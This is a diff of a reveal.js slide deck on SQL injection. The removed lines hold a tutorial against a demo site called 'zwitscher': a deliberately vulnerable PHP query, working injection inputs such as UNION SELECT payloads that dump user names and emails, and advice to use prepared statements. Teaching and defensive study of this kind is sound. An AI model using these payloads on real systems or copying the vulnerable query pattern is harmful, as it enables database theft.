@@ -1,177 +1,61 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-  <head>
-    <title>SQL Injections</title>
-    <meta charset="UTF-8">
-    <link rel="stylesheet" href="css/reveal.css">
-    <link rel="stylesheet" href="css/theme/white.css">
-    <link rel="stylesheet" href="css/sqli.css">
-  </head>
-  <body>
-    <div class="reveal">
-      <div class="slides">
-        <section>
-          <h1>SQL Injections for fun <del>and profit</del></h1>
-        </section>
-        <section>
-          <h2>SQL</h2>
-          <ul>
-            <li>Short for Structured Query Language</li>
-            <li>Language to query a database</li>
-            <li>Commonly used for web applications</li>
-            <li>LAMP ( Linux / Apache / MySQL / PHP )</li>
-          </ul>
-        </section>
-        <section>
-          <h2>Example querys</h2>
-          <pre><code class="sql" data-trim>SELECT * FROM zwitscher WHERE hashtag='#trivia';</code></pre>
-          <pre><code class="sql" data-trim>SELECT * FROM zwitscher WHERE hashtag='#trivia' OR hashtag='#cat';</code></pre>
-          <pre><code class="sql" data-trim>SELECT user  FROM zwitscher WHERE message='Things allways end well.';</code></pre>
-          <p><a href="http://www.w3schools.com/sql/sql_select.asp">SELECT</a>Selects which fields shall be returned</p>
-          <p><a href="http://www.w3schools.com/sql/sql_select.asp">FROM</a>Selects the table</p>
-          <p><a href="http://www.w3schools.com/sql/sql_where.asp">WHERE</a>Optional: allows to formulate where clauses</p>
-        </section>
-        <section>
-          <h2>Dynamic querys with PHP</h2>
-          <p>Bad example! Dont do this!</p>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';";
-$q = mysql_query($sql);</code></pre>
-          <p>Code runs <a data-preview-link href="../zwitscher/">here</a></p>
-          <p>What happens if the user is giving malicious input?</p>
-          <p>Input neigther validated nor escaped</p>
-        </section>
-        <section>
-          <h2>Query 1</h2>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';"; </code></pre>
-          <p>Input: #cat</p>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat'; </code></pre>
-          <p><a data-preview-link href="../zwitscher/?search=%23cat">Zwitscher link</a></p>
-        </section>
-        <section>
-          <h2>Query 2</h2>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';"; </code></pre>
-          <p>Input: #cat' OR hashtag='#trivia</p>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';</code></pre>
-          <p><a data-preview-link href="../zwitscher/?search=%23cat%27+OR+hashtag%3D%27%23trivia">Zwitscher link</a></p>
-        </section>
-        <section>
-          <h2>Query 3</h2>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';"; </code></pre>
-          <p>Input: #dog' OR '1'='1</p>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1'; </code></pre>
-          <p><a data-preview-link href="../zwitscher/?search=%23dog%27+OR+%271%27%3D%271">Zwitscher link</a></p>
-        </section>
-        <section>
-          <h2>What have we learnd so far?</h2>
-          <p>Obvious: User can change the keyword</p>
-          <p>Unwanted: Attacker can manipulate</p>
-          <p>How bad is this anyway? Should i care?</p>
-        </section>
-        <section>
-          <h1>Yes you should care!</h1>
-          <p>Attacker could login without password</p>
-          <p>Attacker not limited to current table</p>
-          <p>SQl allows to 'concatenate' two query result tables with<a href="http://www.w3schools.com/sql/sql_union.asp">UNION</a></p>
-        </section>
-        <section>
-          <h2>More about zwitscher</h2>
-          <p><a data-preview-link href="../zwitscher/">Zwitscher</a> has not only a table for the messages but also a secondary table for its users. We know its name and also the fieldnames.</p>
-          <p>Tablename: user</p>
-          <p>Fields: username, mail, passwort, age</p>
-          <p>Approach: Join a 'normal' message query result with an additional query against user</p>
-        </section>
-        <section>
-          <h2>First try</h2>
-          <pre><code class="php" data-trim>$sql = "SELECT * FROM zwitscher WHERE hashtag = '" .$search. "';"; </code></pre>
-          <p>Input: #dog' UNION SELECT *  FROM user</p>
-          <pre><code class="php" data-trim>$sql = SELECT * FROM zwitscher WHERE hashtag = '#dog' UNION SELECT * FROM user';</pre></code>
-          <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1</p>
-          <p><a data-preview-link href="../zwitscher/?search=%23hashtag%27+UNION+SELECT+*+FROM+user">Zwitscher</a></p>
-          <p>Syntax error: There is a interfering quotation mark</p>
-        </section>
-        <section>
-          <h2>Second try</h2>
-          <p>Approach: Get rid of interfering characters by commenting them out</p>
-          <p>Input: #dog' UNION SELECT *  FROM user; -- </p>
-          <p>Important: Space after delimiter</p>
-          <pre><code class="php" data-trim>$sql = SELECT * FROM zwitscher WHERE hashtag = '' UNION SELECT * FROM user; -- '; </pre></code>
-          <pre><code class="php" data-trim>The used SELECT statements have a different number of columns </code></pre>
-          <p><a data-preview-link href="../zwitscher/?search=%27+UNION+SELECT+*+FROM+user%3B+--+">Zwitscher</a></p>
-          <p>Union requires the same number of fields in both result tables</p>
-        </section>
-        <section>
-          <h2>What now?</h2>
-          <p>How many fields are there in first query?</p>
-          <p>We dont know :(</p>
-	  <p>Are we stuck?</p>
-        </section>
-        <section>
-          <h2>What now? Brutforce!</h2>
-          <section>
-            <p>@@VERSION returns a table with one field and one column, containing the current server version</p>
-            <p>@@VERSION, @@VERSION returns a table with on column and two fields, both containing the current server version</p>
-	    <p>@@VERSION, @@VERSION, @@VERSION returns ...
-            <p>Approach: Bruteforce... increment until thers a match</p>
-          </section>
-          <section>
-            <p>Input: #dog' UNION SELECT @@VERSION; --</p>
-            <p><a data-preview-link href="../zwitscher/?search=%27+UNION+SELECT+%40%40VERSION%3B+--+">Zwitscher</a> :(</p>
-          </section>
-          <section>
-            <p>Input: #dog' UNION SELECT @@VERSION, @@VERSION; --</p>
-            <p><a data-preview-link href="../zwitscher/?search=%27+UNION+SELECT+%40%40VERSION%2C+%40%40VERSION%3B+--+">Zwitscher</a> :(</p>
-          </section>
-          <section>
-            <p>Input: #dog' UNION SELECT @@VERSION, @@VERSION, @@VERSION; -- </p>
-            <p><a data-preview-link href="../zwitscher/?search=%27+UNION+SELECT+%40%40VERSION%2C+%40%40VERSION%2C+%40%40VERSION%3B+--+">Zwitscher</a> :)</p>
-          </section>
-        </section>
-      <section>
-        <h2>Third Try</h2>
-        <p>How many fields are there in the first query? 3 Fields!</p>
-        <p>Select 3 fields: username, mail und age</p>
-        <p>Input: #dog' UNION SELECT username, mail, age FROM user; -- </p>
-        <p><a data-preview-link href="../zwitscher/?search=%23dog%27+UNION+SELECT+username%2C+mail%2C+age+FROM+user%3B+--+">Zwitscher</a></p>
-        <p>Bingo!</p>
-      </section>
-      <section>
-        <h2>Recap</h2>
-        <p>Different tables can be read</p>
-        <p>There are problems:</p>
-        <p>Tablenames unknown</p>
-        <p>Fieldnames unknown</p>
-        <p>What now?</p>
-      </section>
-      <section>
-        <h2>Getting table and field names</h2>
-	<p>Metadata available in <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema.html">information_schema</a> database</p>
-	<p>Mostly in <a href="https://dev.mysql.com/doc/refman/8.0/en/tables-table.html">information_schema.tables</a> and <a href="https://dev.mysql.com/doc/refman/8.0/en/columns-table.html">information_schema.columns</a></p>
-        <p>How to get them? Same way as before!</p>
-      </section>
-      <section>
-        <h2>How to avoid this Problem</h2>
-        <p>Never trust user input</p>
-        <p>Dont build your querys by concatenating strings</p>
-	<p>Use save methods for database interatction</p>
-        <p>In php: prepared statements</p>
-      </section>
-      <section>
-        <h2>Lets do it</h2>
-	<p>There is a third table on <a href="../zwitscher/">zwitscher</a> ...</p>
-	<p>Can you dump it?</p>
-      </section>
-      <section>
-        <h2>Links</h2>
-	<p><a href="https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections">Exploiting Filtered SQLi</a></p>
-	<p><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql">Filter evasion cheat sheet</a></p>
-        <p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">Cheat Sheet pentestmonkey</a></p>
-        <p><a href="http://en.wikipedia.org/wiki/SQL_injection">Englische Wikipedia</a></p>
-        <p><a href="../zwitscher/?src">Sourcecode von Zwitscher</a></p>
-      </section>
-    </div>
-  </div>
-  <script src="js/reveal.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/headjs/0.96/head.min.js"></script>
-  <script>Reveal.initialize({ viewDistance: 10 });</script>
-  </body>
+
+    <head>
+        <meta charset="utf-8">
+
+        <title>SQL Injections</title>
+
+        <link rel="stylesheet" href="css/reveal.css">
+        <link rel="stylesheet" href="css/theme/white.css">
+
+        <link rel="stylesheet" href="lib/css/monokai.css">
+
+    </head>
+
+    <body>
+
+        <div class="reveal">
+
+            <div class = "slides">
+
+                <!-- Use external markdown resource, separate slide by three dashes; vertical slides by three asterisks -->
+                <section
+                data-markdown="content.md"
+                data-separator="^\n---\n$" data-separator-vertical="^\n--\n$"
+                data-charset="utf-8">
+                </section>
+
+            </div>
+
+        </div>
+
+        <script src="js/reveal.js"></script>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/headjs/0.96/head.min.js"></script>
+
+        <script>
+            Reveal.initialize({
+                hash: true,
+                viewDistance: 10,
+                previewLinks: true,
+                width: 1312,
+                dependencies: [
+                    
+                    // Interpret Markdown in <section> elements
+                    { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+                    { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+
+                    // Syntax highlight for <code> elements
+                    { src: 'plugin/highlight/highlight.js', async: true },
+
+                    // Zoom in and out with Alt+click
+		            { src: 'plugin/zoom-js/zoom.js', async: true }
+
+                ]
+            });
+        </script>
+
+    </body>
+
 </html>
